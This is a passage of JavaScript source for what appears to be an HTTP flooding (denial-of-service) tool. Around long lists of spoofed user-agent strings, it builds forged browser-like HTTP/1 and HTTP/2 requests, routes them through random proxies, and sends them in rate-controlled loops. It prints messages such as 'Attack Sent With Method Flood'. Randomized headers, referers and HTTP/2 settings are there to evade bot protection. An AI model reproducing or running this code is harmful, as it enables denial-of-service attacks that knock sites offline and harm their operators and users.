'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:103.0) Gecko/103.0 Firefox/103.0',
'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 11; M2007J20CG Build/RKQ1.200826.002)',
'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/103.0',
'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; pl-pl; Redmi Note 8T Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.5.1-gn',
'Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobil',
'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobil',
'Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.6; fr-fr; Nexus One Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.7; fr-fr; Nexus One Build/GWK74) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; Nexus One Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edg',
'Mozilla/5.0 (Windows Phone 10.0; Android 10; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 Edge/',
'Mozilla/5.0 (Windows Phone 10.0; Android 7.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Ed',
'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge',
'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Ed',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/5',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWA Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/5',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1',
'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1',
'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPod; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
];
var userAgent = uap[Math.floor(Math.floor(Math.random() * uap.length))];

    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6,6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if(hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.3\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: ' + encoding + '\r\n' +
        'Accept-Language: ' + lang +'\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: ' + dest1 + '\r\n' +
        'Sec-Fetch-Mode: ' + mode1 + '\r\n' +
        'Sec-Fetch-Site: ' + site1 + '\r\n' +
        'Content-Type: ' + type1 + '\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform:  "Windows"\r\n' + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    //console.log(headers.toString());
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }
    let interval
    if (input === 'flood') {
        process.stdout.write('Attack Sent With Method Flood !\r\n');
        interval = 1000;
    } else if (input === 'bypass') {
        process.stdout.write('Attack Sent With Method Bypass !\r\n');
        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        interval = randomDelay(1000, 5000);
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        //setsockopt(netSocket, 1, 7, 140000)
        //setsockopt(netSocket, 1, 8, 655360000)
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp == 1 ? ['http/1.2'] : forceHttp == 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.3'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.3') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })

                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(15663105, 0)

                const headertablesize = Math.floor(Math.random() * 2) + 65535;
                const frandom = Math.floor(Math.random() * 6);

                let fchoicev1, fchoicev2;

                if (frandom === 0) {
                    fchoicev1 = 131072;
                    fchoicev2 = 262142;
                } else if (frandom === 1) {
                    fchoicev1 = 131073;
                    fchoicev2 = 262143;
                } else if (frandom === 2) {
                    fchoicev1 = 131074;
                    fchoicev2 = 262144;
                } else if (frandom === 3) {
                    fchoicev1 = 6291455;
                    fchoicev2 = 262145;
                }
                else if (frandom === 4) {
                    fchoicev1 = 6291454;
                    fchoicev2 = 262144;
                }
                else if (frandom === 5) {
                    fchoicev1 = 6291456;
                    fchoicev2 = 262146;
                }

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, headertablesize],
                        [2, 0],
                        [4, fchoicev1],
                        [6, fchoicev2]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {

                                        //console.log("goaway", frame.payload.readUint32BE(0), frame.payload.readUint32BE(4))

                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                }

                                tlsSocket.end(() => tlsSocket.destroy())
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    //const fwq = getRandomInt(0,1);
                    const requests = []
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }
                    let ratelimit;
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(1, 90);
                    } else {
                        ratelimit = process.argv[5];
                    }
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        const browserVersion = getRandomInt(120, 123);

                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';


                        const secGpcValue = isBrave ? "1" : undefined;
                        
                        const uap = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.3 Iceweasel/2.0.0.13 (Debian-2.0.0.13-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-0etch1)",
"Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.13) Gecko/20101203 IceWeasel/2.0.0.11 Mnenhy/0.8.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-4)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.1) Gecko/2006120502 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.0.9) Gecko/2009050519 iceweasel/2.0 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en; rv:1.8.1) Gecko/20061024 Iceweasel/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20061022 Iceweasel/1.5.0.7-g2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.8pre) Gecko/20061001 Firefox/1.5.0.8pre (Iceweasel)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.0.7) Gecko/2009030814 Iceweasel Firefox/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (Linux; Android 12; motorola edge 20 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 11; CPH1979) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 12; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/105.0.1296.0",
"Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 12; SM-A725F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.178 Safari/537.36 Edg/98.0.1108.50",
"Mozilla/5.0 (Linux; Android 10; SM-G960U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
"Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 10; JNY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
"Mozilla/5.0 (Linux; Android 10; LM-K200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
"Mozilla/5.0 (Linux; Android 12; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4041.0 Safari/537.36 Edg/81.0.409.0",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Mobile Safari/537.36 EdgA/99.0.1150.52",
"Mozilla/5.0 (Linux; Android 7.0; SM-J701M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 11; TECNO CG7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5111.0 Safari/537.36 Edg/104.0.1290.0",
"Mozilla/5.0 (Linux; Android 11; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 11; SM-A505GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB) Gecko/20161904 Firefox/104.0",
